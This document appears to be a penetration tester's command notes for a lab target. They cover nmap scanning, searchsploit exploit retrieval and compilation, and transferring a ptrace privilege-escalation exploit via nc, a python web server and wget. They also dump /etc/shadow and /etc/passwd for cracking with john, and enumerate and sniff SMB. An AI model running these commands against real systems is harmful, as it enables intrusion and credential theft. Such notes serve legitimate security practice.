## Ports
nmap -vv -p- 192.168.91.6 -oN ports.txt

## Services
nmap -vv -sV -O -p 22,80,443,139,111,32768 192.168.91.6 -oN services.txt

## Metasploit
searchsploit mod_ssl
searchsploit samba 2.2.1
searchsploit -m 47080

gcc -o exploit_name 47080.c -lcrypto
./exploit_name 0x6b 192.168.91.6

sudo nc -lvnp 443 < ptrace-kmod.c
python3 -m http.server 80
wget 192.168.80.177/ptrace-kmod.c

cat /etc/shadow
cat /etc/passwd
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
john --show passwords.txt

msfconsole
search smb_version
use /auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.91.6
run

sudo tcpdump -s0 -n -i eth0 src 192.168.91.6 and port 139 -A -c 7 2>/dev/null
smbclient -L 192.168.91.6 


base64 -d reminder.txt > key.txt
nmap -sC -p 80 192.168.91.26

nmapAutomator.sh --host 192.168.90.92 --type All
nmap -vv -p- 192.168.91.6 -oN portas.txt
nmap -vv -sV -O -p 22,80,XXX 192.168.91.6 -oN servicos.txt
searchsploit OpenSSH 2.9p2
